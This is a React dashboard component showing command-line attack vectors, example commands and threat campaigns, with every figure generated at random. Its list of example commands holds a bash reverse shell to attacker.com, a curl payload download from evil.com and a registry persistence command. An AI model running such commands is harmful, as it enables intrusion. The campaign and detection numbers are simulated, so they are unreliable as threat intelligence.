/**
 * Command Line Execution Vectors Analysis
 * Comprehensive analysis of command line-based attack vectors and techniques
 */

import React, { useState, useEffect, useMemo, useCallback } from 'react';
import {
  Box,
  Grid,
  Card,
  CardContent,
  Typography,
  Button,
  IconButton,
  Chip,
  Avatar,
  LinearProgress,
  Alert,
  Tooltip,
  useTheme,
  alpha,
  Paper,
  List,
  ListItem,
  ListItemText,
  ListItemIcon,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  TablePagination,
  TextField,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  CircularProgress,
  Tabs,
  Tab,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  Badge,
  Accordion,
  AccordionSummary,
  AccordionDetails,
} from '@mui/material';

import {
  Terminal,
  Security,
  Warning,
  Assessment,
  TrendingUp,
  Shield,
  BugReport,
  Visibility,
  Search,
  Refresh,
  OpenInNew,
  CheckCircle,  Error as ErrorIcon,
  Code,
  Computer,
  Memory,
  ExpandMore,
  PlayArrow,
  Stop,
  FileCopy,
  Build,
} from '@mui/icons-material';

// Interfaces
interface CommandLineVector {
  id: string;
  name: string;
  command_type: 'cmd' | 'powershell' | 'bash' | 'python' | 'ruby' | 'perl' | 'vbs' | 'batch';
  platform: 'windows' | 'linux' | 'macos' | 'cross_platform';
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  attack_techniques: string[];
  common_payloads: string[];
  evasion_methods: string[];
  persistence_mechanisms: string[];
  privilege_requirements: 'user' | 'admin' | 'system' | 'any';
  network_requirements: 'none' | 'outbound' | 'inbound' | 'both';
  detection_signatures: string[];
  prevention_controls: string[];
  real_world_usage: string[];
  mitre_techniques: string[];
  complexity_level: 'basic' | 'intermediate' | 'advanced' | 'expert';
  stealth_rating: number;
  effectiveness_rating: number;
  first_observed: Date;
  last_updated: Date;
  frequency_observed: number;
}

interface CommandExecution {
  id: string;
  command: string;
  description: string;
  platform: string;
  purpose: string;
  risk_level: 'low' | 'medium' | 'high' | 'critical';
  obfuscated_variants: string[];
  detection_rules: string[];
  mitigation_techniques: string[];
  example_usage: string;
  associated_malware: string[];
}

interface ExecutionCampaign {
  id: string;
  name: string;
  actor_group: string;
  start_date: Date;
  end_date?: Date;
  target_platforms: string[];
  command_types_used: string[];
  victims_affected: number;
  success_rate: number;
  primary_objectives: string[];
  techniques_observed: string[];
  detection_rate: number;
  geographic_distribution: string[];
}

interface CommandLineMetrics {
  total_vectors: number;
  active_campaigns: number;
  detection_coverage: number;
  high_risk_commands: number;
  platform_distribution: { [key: string]: number };
  complexity_distribution: { [key: string]: number };
  avg_stealth_rating: number;
  avg_effectiveness: number;
}

const CommandLineExecutionVectors: React.FC = () => {
  const theme = useTheme();
  
  // State management
  const [vectors, setVectors] = useState<CommandLineVector[]>([]);
  const [executions, setExecutions] = useState<CommandExecution[]>([]);
  const [campaigns, setCampaigns] = useState<ExecutionCampaign[]>([]);
  const [metrics, setMetrics] = useState<CommandLineMetrics | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  
  // Selection states
  const [selectedVector, setSelectedVector] = useState<CommandLineVector | null>(null);
  const [selectedExecution, setSelectedExecution] = useState<CommandExecution | null>(null);
  
  // UI states
  const [activeTab, setActiveTab] = useState(0);
  const [detailsOpen, setDetailsOpen] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterPlatform, setFilterPlatform] = useState<string>('all');
  const [filterType, setFilterType] = useState<string>('all');
  const [filterSeverity, setFilterSeverity] = useState<string>('all');
  const [page, setPage] = useState(0);
  const [rowsPerPage, setRowsPerPage] = useState(10);

  // Simulated data generation
  const generateCommandLineData = useCallback(() => {
    const commandTypes = ['cmd', 'powershell', 'bash', 'python', 'ruby', 'perl', 'vbs', 'batch'] as const;
    const platforms = ['windows', 'linux', 'macos', 'cross_platform'] as const;
    const severityLevels = ['low', 'medium', 'high', 'critical'] as const;
    const complexityLevels = ['basic', 'intermediate', 'advanced', 'expert'] as const;

    // Generate command line vectors
    const vectorData: CommandLineVector[] = [];
    for (let i = 0; i < 20; i++) {
      const commandType = commandTypes[Math.floor(Math.random() * commandTypes.length)];
      const platform = platforms[Math.floor(Math.random() * platforms.length)];
      const severity = severityLevels[Math.floor(Math.random() * severityLevels.length)];
      const complexity = complexityLevels[Math.floor(Math.random() * complexityLevels.length)];
      
      vectorData.push({
        id: `vector-${i + 1}`,
        name: `${commandType.toUpperCase()} Execution Vector ${i + 1}`,
        command_type: commandType,
        platform,
        severity: severity as any,
        description: `${commandType} command execution vector targeting ${platform} systems for malicious activities`,
        attack_techniques: [
          'Code Injection',
          'Living off the Land',
          'Process Hollowing',
          'DLL Injection',
          'Reflective Loading'
        ],
        common_payloads: [
          'Reverse Shell',
          'Backdoor Installation',
          'Data Exfiltration',
          'Privilege Escalation',
          'Lateral Movement'
        ],
        evasion_methods: [
          'Base64 Encoding',
          'String Obfuscation',
          'Environment Variable Abuse',
          'Whitespace Manipulation',
          'Character Substitution'
        ],
        persistence_mechanisms: [
          'Registry Modification',
          'Scheduled Task Creation',
          'Service Installation',
          'Startup Folder',
          'WMI Event Subscription'
        ],
        privilege_requirements: ['user', 'admin', 'system', 'any'][Math.floor(Math.random() * 4)] as any,
        network_requirements: ['none', 'outbound', 'inbound', 'both'][Math.floor(Math.random() * 4)] as any,
        detection_signatures: [
          'Suspicious command patterns',
          'Unusual process creation',
          'Network anomalies',
          'File system changes'
        ],
        prevention_controls: [
          'Application Whitelisting',
          'Command Line Monitoring',
          'Execution Prevention',
          'Behavioral Analysis'
        ],
        real_world_usage: [
          'APT campaigns',
          'Ransomware deployment',
          'Cryptocurrency mining',
          'Data theft operations'
        ],
        mitre_techniques: [
          'T1059',
          'T1055',
          'T1027',
          'T1105'
        ],
        complexity_level: complexity,
        stealth_rating: Math.floor(Math.random() * 10) + 1,
        effectiveness_rating: Math.floor(Math.random() * 10) + 1,
        first_observed: new Date(Date.now() - Math.random() * 1000 * 24 * 60 * 60 * 1000),
        last_updated: new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000),
        frequency_observed: Math.floor(Math.random() * 100) + 10
      });
    }

    // Generate command executions
    const executionData: CommandExecution[] = [];
    const commonCommands = [
      { cmd: 'cmd.exe /c "whoami"', desc: 'User enumeration', platform: 'Windows' },
      { cmd: 'powershell -enc <base64>', desc: 'Encoded PowerShell execution', platform: 'Windows' },
      { cmd: 'curl -o /tmp/payload http://evil.com/malware', desc: 'Payload download', platform: 'Linux' },
      { cmd: 'python -c "import os; os.system(\'ls\')"', desc: 'Python command execution', platform: 'Cross-platform' },
      { cmd: 'wmic process call create "notepad.exe"', desc: 'WMI process creation', platform: 'Windows' },
      { cmd: 'bash -i >& /dev/tcp/attacker.com/4444 0>&1', desc: 'Reverse shell', platform: 'Linux' },
      { cmd: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', desc: 'Registry persistence', platform: 'Windows' },
      { cmd: 'crontab -e', desc: 'Scheduled task creation', platform: 'Linux' }
    ];

    commonCommands.forEach((cmdData, index) => {
      executionData.push({
        id: `execution-${index + 1}`,
        command: cmdData.cmd,
        description: cmdData.desc,
        platform: cmdData.platform,
        purpose: ['Reconnaissance', 'Persistence', 'Execution', 'Exfiltration'][Math.floor(Math.random() * 4)],
        risk_level: severityLevels[Math.floor(Math.random() * severityLevels.length)] as any,
        obfuscated_variants: [
          'Base64 encoded version',
          'Environment variable substitution',
          'Character obfuscation'
        ],
        detection_rules: [
          'Sigma rule for command detection',
          'YARA rule for payload detection',
          'Network IDS signature'
        ],
        mitigation_techniques: [
          'Application control policies',
          'Command line auditing',
          'Network monitoring',
          'Behavioral detection'
        ],
        example_usage: `Example usage in ${['APT29', 'Lazarus', 'FIN7', 'Carbanak'][Math.floor(Math.random() * 4)]} campaign`,
        associated_malware: [
          'TrickBot',
          'Emotet',
          'Cobalt Strike',
          'Metasploit'
        ].slice(0, Math.floor(Math.random() * 3) + 1)
      });
    });

    // Generate execution campaigns
    const campaignData: ExecutionCampaign[] = [];
    for (let i = 0; i < 8; i++) {
      const startDate = new Date(Date.now() - Math.random() * 365 * 24 * 60 * 60 * 1000);
      
      campaignData.push({
        id: `campaign-${i + 1}`,
        name: `Command Execution Campaign ${i + 1}`,
        actor_group: `APT-${Math.floor(Math.random() * 50) + 1}`,
        start_date: startDate,
        end_date: Math.random() > 0.3 ? new Date(startDate.getTime() + Math.random() * 180 * 24 * 60 * 60 * 1000) : undefined,
        target_platforms: platforms.slice(0, Math.floor(Math.random() * 3) + 1),
        command_types_used: commandTypes.slice(0, Math.floor(Math.random() * 4) + 1),
        victims_affected: Math.floor(Math.random() * 5000) + 100,
        success_rate: Math.floor(Math.random() * 60) + 20,
        primary_objectives: [
          'Data Theft',
          'Ransomware Deployment',
          'Cryptocurrency Mining',
          'Botnet Recruitment'
        ].slice(0, Math.floor(Math.random() * 3) + 1),
        techniques_observed: [
          'Living off the Land',
          'Fileless Execution',
          'Process Injection',
          'Memory Manipulation'
        ].slice(0, Math.floor(Math.random() * 3) + 1),
        detection_rate: Math.floor(Math.random() * 80) + 20,
        geographic_distribution: ['US', 'EU', 'APAC', 'Global'].slice(0, Math.floor(Math.random() * 3) + 1)
      });
    }

    // Generate metrics
    const platformDist = platforms.reduce((acc, platform) => {
      acc[platform] = vectorData.filter(v => v.platform === platform).length;
      return acc;
    }, {} as { [key: string]: number });

    const complexityDist = complexityLevels.reduce((acc, complexity) => {
      acc[complexity] = vectorData.filter(v => v.complexity_level === complexity).length;
      return acc;
    }, {} as { [key: string]: number });

    const metricsData: CommandLineMetrics = {
      total_vectors: vectorData.length,
      active_campaigns: campaignData.filter(c => !c.end_date).length,
      detection_coverage: Math.floor(Math.random() * 30) + 70,
      high_risk_commands: vectorData.filter(v => v.severity === 'high' || v.severity === 'critical').length,
      platform_distribution: platformDist,
      complexity_distribution: complexityDist,
      avg_stealth_rating: Math.floor(vectorData.reduce((sum, v) => sum + v.stealth_rating, 0) / vectorData.length),
      avg_effectiveness: Math.floor(vectorData.reduce((sum, v) => sum + v.effectiveness_rating, 0) / vectorData.length)
    };

    setVectors(vectorData);
    setExecutions(executionData);
    setCampaigns(campaignData);
    setMetrics(metricsData);
    setLoading(false);
  }, []);

  useEffect(() => {
    generateCommandLineData();
  }, [generateCommandLineData]);

  // Filtered data
  const filteredVectors = useMemo(() => {
    return vectors.filter(vector => {
      const matchesSearch = vector.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                           vector.description.toLowerCase().includes(searchTerm.toLowerCase());
      const matchesPlatform = filterPlatform === 'all' || vector.platform === filterPlatform;
      const matchesType = filterType === 'all' || vector.command_type === filterType;
      const matchesSeverity = filterSeverity === 'all' || vector.severity === filterSeverity;
      
      return matchesSearch && matchesPlatform && matchesType && matchesSeverity;
    });
  }, [vectors, searchTerm, filterPlatform, filterType, filterSeverity]);

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return theme.palette.error.main;
      case 'high': return '#ff9800';
      case 'medium': return theme.palette.warning.main;
      case 'low': return theme.palette.success.main;
      default: return theme.palette.grey[500];
    }
  };

  const getPlatformIcon = (platform: string) => {
    switch (platform) {
      case 'windows': return <Computer />;
      case 'linux': return <Terminal />;
      case 'macos': return <Computer />;
      case 'cross_platform': return <Code />;
      default: return <Security />;
    }
  };

  const getCommandTypeIcon = (type: string) => {
    switch (type) {
      case 'cmd': return <Terminal />;
      case 'powershell': return <Build />;
      case 'bash': return <Code />;
      case 'python': return <PlayArrow />;
      default: return <Terminal />;
    }
  };

  // Render overview metrics
  const renderOverviewMetrics = () => (
    <Grid container spacing={3} sx={{ mb: 3 }}>
      {[
        { label: 'Total Vectors', value: metrics?.total_vectors || 0, icon: <Terminal />, color: theme.palette.primary.main },
        { label: 'High Risk Commands', value: metrics?.high_risk_commands || 0, icon: <Warning />, color: theme.palette.error.main },
        { label: 'Active Campaigns', value: metrics?.active_campaigns || 0, icon: <TrendingUp />, color: theme.palette.warning.main },
        { label: 'Detection Coverage', value: `${metrics?.detection_coverage || 0}%`, icon: <Shield />, color: theme.palette.success.main }
      ].map((metric, index) => (
        <Grid item xs={12} sm={6} lg={3} key={index}>
          <Card>
            <CardContent>
              <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                <Box>
                  <Typography variant="h4" fontWeight="bold">
                    {metric.value}
                  </Typography>
                  <Typography variant="body2" color="textSecondary">
                    {metric.label}
                  </Typography>
                </Box>
                <Avatar sx={{ bgcolor: alpha(metric.color, 0.1), color: metric.color }}>
                  {metric.icon}
                </Avatar>
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  // Render vectors table
  const renderVectorsTable = () => (
    <TableContainer component={Paper}>
      <Table>
        <TableHead>
          <TableRow>
            <TableCell>Vector Name</TableCell>
            <TableCell>Command Type</TableCell>
            <TableCell>Platform</TableCell>
            <TableCell>Severity</TableCell>
            <TableCell>Complexity</TableCell>
            <TableCell>Stealth Rating</TableCell>
            <TableCell>Effectiveness</TableCell>
            <TableCell>Actions</TableCell>
          </TableRow>
        </TableHead>
        <TableBody>
          {filteredVectors
            .slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)
            .map((vector) => (
              <TableRow key={vector.id} hover>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    {getCommandTypeIcon(vector.command_type)}
                    <Typography variant="body2">{vector.name}</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <Chip size="small" label={vector.command_type} />
                </TableCell>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    {getPlatformIcon(vector.platform)}
                    <Typography variant="body2">{vector.platform}</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <Chip
                    size="small"
                    label={vector.severity}
                    sx={{
                      bgcolor: alpha(getSeverityColor(vector.severity), 0.1),
                      color: getSeverityColor(vector.severity)
                    }}
                  />
                </TableCell>
                <TableCell>
                  <Chip
                    size="small"
                    label={vector.complexity_level}
                    color={vector.complexity_level === 'expert' ? 'error' : 
                           vector.complexity_level === 'advanced' ? 'warning' : 'default'}
                  />
                </TableCell>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    <LinearProgress
                      variant="determinate"
                      value={vector.stealth_rating * 10}
                      sx={{ flexGrow: 1, height: 6, borderRadius: 3 }}
                      color={vector.stealth_rating > 7 ? 'error' : vector.stealth_rating > 4 ? 'warning' : 'success'}
                    />
                    <Typography variant="caption">{vector.stealth_rating}/10</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    <LinearProgress
                      variant="determinate"
                      value={vector.effectiveness_rating * 10}
                      sx={{ flexGrow: 1, height: 6, borderRadius: 3 }}
                      color={vector.effectiveness_rating > 7 ? 'success' : vector.effectiveness_rating > 4 ? 'warning' : 'error'}
                    />
                    <Typography variant="caption">{vector.effectiveness_rating}/10</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <IconButton
                    size="small"
                    onClick={() => {
                      setSelectedVector(vector);
                      setDetailsOpen(true);
                    }}
                  >
                    <Visibility />
                  </IconButton>
                </TableCell>
              </TableRow>
            ))}
        </TableBody>
      </Table>
      <TablePagination
        component="div"
        count={filteredVectors.length}
        page={page}
        onPageChange={(_, newPage) => setPage(newPage)}
        rowsPerPage={rowsPerPage}
        onRowsPerPageChange={(event) => {
          setRowsPerPage(parseInt(event.target.value, 10));
          setPage(0);
        }}
      />
    </TableContainer>
  );

  // Render command executions
  const renderExecutions = () => (
    <Grid container spacing={3}>
      {executions.map((execution) => (
        <Grid item xs={12} md={6} key={execution.id}>
          <Card 
            sx={{ 
              cursor: 'pointer',
              transition: 'all 0.3s ease',
              '&:hover': {
                transform: 'translateY(-2px)',
                boxShadow: theme.shadows[4],
              }
            }}
            onClick={() => {
              setSelectedExecution(execution);
              setDetailsOpen(true);
            }}
          >
            <CardContent>
              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'start', mb: 2 }}>
                <Typography variant="h6" gutterBottom>
                  {execution.description}
                </Typography>
                <Chip
                  size="small"
                  label={execution.risk_level}
                  sx={{
                    bgcolor: alpha(getSeverityColor(execution.risk_level), 0.1),
                    color: getSeverityColor(execution.risk_level)
                  }}
                />
              </Box>
              <Box sx={{ mb: 2, bgcolor: theme.palette.grey[100], p: 2, borderRadius: 1 }}>
                <Typography variant="body2" fontFamily="monospace" sx={{ wordBreak: 'break-all' }}>
                  {execution.command}
                </Typography>
              </Box>
              <Box sx={{ mb: 2 }}>
                <Typography variant="caption" display="block">
                  Platform: {execution.platform}
                </Typography>
                <Typography variant="caption" display="block">
                  Purpose: {execution.purpose}
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
                {execution.associated_malware.slice(0, 2).map((malware) => (
                  <Chip key={malware} size="small" label={malware} variant="outlined" />
                ))}
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  // Render campaigns
  const renderCampaigns = () => (
    <Grid container spacing={3}>
      {campaigns.map((campaign) => (
        <Grid item xs={12} md={6} lg={4} key={campaign.id}>
          <Card>
            <CardContent>
              <Typography variant="h6" gutterBottom>
                {campaign.name}
              </Typography>
              <Typography variant="body2" color="textSecondary" gutterBottom>
                Actor: {campaign.actor_group}
              </Typography>
              <Box sx={{ mb: 2 }}>
                <Typography variant="caption" display="block">
                  Victims: {campaign.victims_affected.toLocaleString()}
                </Typography>
                <Typography variant="caption" display="block">
                  Success Rate: {campaign.success_rate}%
                </Typography>
                <Typography variant="caption" display="block">
                  Detection Rate: {campaign.detection_rate}%
                </Typography>
                <Typography variant="caption" display="block">
                  Duration: {campaign.start_date.toLocaleDateString()} - {campaign.end_date?.toLocaleDateString() || 'Ongoing'}
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap', mb: 1 }}>
                {campaign.command_types_used.slice(0, 3).map((type) => (
                  <Chip key={type} size="small" label={type} />
                ))}
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
                {campaign.primary_objectives.slice(0, 2).map((objective) => (
                  <Chip key={objective} size="small" label={objective} variant="outlined" />
                ))}
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  if (loading) {
    return (
      <Box sx={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: 400 }}>
        <CircularProgress />
      </Box>
    );
  }

  if (error) {
    return (
      <Alert severity="error" sx={{ m: 2 }}>
        {error}
      </Alert>
    );
  }

  return (
    <Box sx={{ p: 3 }}>
      <Box sx={{ mb: 3 }}>
        <Typography variant="h4" gutterBottom>
          Command Line Execution Vectors
        </Typography>
        <Typography variant="body1" color="textSecondary">
          Comprehensive analysis of command line-based attack vectors and malicious execution techniques
        </Typography>
      </Box>

      {renderOverviewMetrics()}

      <Card sx={{ mb: 3 }}>
        <CardContent>
          <Box sx={{ display: 'flex', gap: 2, mb: 3, flexWrap: 'wrap' }}>
            <TextField
              size="small"
              placeholder="Search vectors..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              InputProps={{
                startAdornment: <Search />
              }}
              sx={{ minWidth: 200 }}
            />
            <FormControl size="small" sx={{ minWidth: 120 }}>
              <InputLabel>Platform</InputLabel>
              <Select
                value={filterPlatform}
                onChange={(e) => setFilterPlatform(e.target.value)}
                label="Platform"
              >
                <MenuItem value="all">All Platforms</MenuItem>
                <MenuItem value="windows">Windows</MenuItem>
                <MenuItem value="linux">Linux</MenuItem>
                <MenuItem value="macos">macOS</MenuItem>
                <MenuItem value="cross_platform">Cross-platform</MenuItem>
              </Select>
            </FormControl>
            <FormControl size="small" sx={{ minWidth: 120 }}>
              <InputLabel>Command Type</InputLabel>
              <Select
                value={filterType}
                onChange={(e) => setFilterType(e.target.value)}
                label="Command Type"
              >
                <MenuItem value="all">All Types</MenuItem>
                <MenuItem value="cmd">CMD</MenuItem>
                <MenuItem value="powershell">PowerShell</MenuItem>
                <MenuItem value="bash">Bash</MenuItem>
                <MenuItem value="python">Python</MenuItem>
                <MenuItem value="ruby">Ruby</MenuItem>
                <MenuItem value="perl">Perl</MenuItem>
                <MenuItem value="vbs">VBScript</MenuItem>
                <MenuItem value="batch">Batch</MenuItem>
              </Select>
            </FormControl>
            <FormControl size="small" sx={{ minWidth: 120 }}>
              <InputLabel>Severity</InputLabel>
              <Select
                value={filterSeverity}
                onChange={(e) => setFilterSeverity(e.target.value)}
                label="Severity"
              >
                <MenuItem value="all">All Severities</MenuItem>
                <MenuItem value="critical">Critical</MenuItem>
                <MenuItem value="high">High</MenuItem>
                <MenuItem value="medium">Medium</MenuItem>
                <MenuItem value="low">Low</MenuItem>
              </Select>
            </FormControl>
            <Button startIcon={<Refresh />} onClick={generateCommandLineData}>
              Refresh
            </Button>
          </Box>

          <Tabs value={activeTab} onChange={(_, newValue) => setActiveTab(newValue)} sx={{ mb: 3 }}>
            <Tab label="Attack Vectors" />
            <Tab label="Command Examples" />
            <Tab label="Campaign Analysis" />
          </Tabs>

          {activeTab === 0 && renderVectorsTable()}
          {activeTab === 1 && renderExecutions()}
          {activeTab === 2 && renderCampaigns()}
        </CardContent>
      </Card>

      {/* Details Dialog */}
      <Dialog
        open={detailsOpen}
        onClose={() => setDetailsOpen(false)}
        maxWidth="lg"
        fullWidth
      >
        <DialogTitle>
          {selectedVector?.name || selectedExecution?.description}
        </DialogTitle>
        <DialogContent>
          {selectedVector && (
            <Grid container spacing={3}>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Vector Details
                  </Typography>
                  <Typography variant="body2" paragraph>
                    {selectedVector.description}
                  </Typography>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="caption" display="block">
                      Command Type: {selectedVector.command_type}
                    </Typography>
                    <Typography variant="caption" display="block">
                      Platform: {selectedVector.platform}
                    </Typography>
                    <Typography variant="caption" display="block">
                      Severity: {selectedVector.severity}
                    </Typography>
                    <Typography variant="caption" display="block">
                      Complexity: {selectedVector.complexity_level}
                    </Typography>
                  </Box>
                </Paper>
              </Grid>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Prevention Controls
                  </Typography>
                  <List dense>
                    {selectedVector.prevention_controls.map((control, index) => (
                      <ListItem key={index}>
                        <ListItemIcon>
                          <Shield />
                        </ListItemIcon>
                        <ListItemText primary={control} />
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>
            </Grid>
          )}
          {selectedExecution && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Command Details
                  </Typography>
                  <Box sx={{ mb: 2, bgcolor: theme.palette.grey[100], p: 2, borderRadius: 1 }}>
                    <Typography variant="body2" fontFamily="monospace">
                      {selectedExecution.command}
                    </Typography>
                  </Box>
                  <Typography variant="body2" paragraph>
                    {selectedExecution.description}
                  </Typography>
                  <Typography variant="body2" paragraph>
                    <strong>Example Usage:</strong> {selectedExecution.example_usage}
                  </Typography>
                </Paper>
              </Grid>
            </Grid>
          )}
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setDetailsOpen(false)}>
            Close
          </Button>
          <Button
            variant="outlined"
            startIcon={<OpenInNew />}
            onClick={() => window.open('https://attack.mitre.org/techniques/T1059/', '_blank')}
          >
            MITRE T1059
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
};

export default CommandLineExecutionVectors;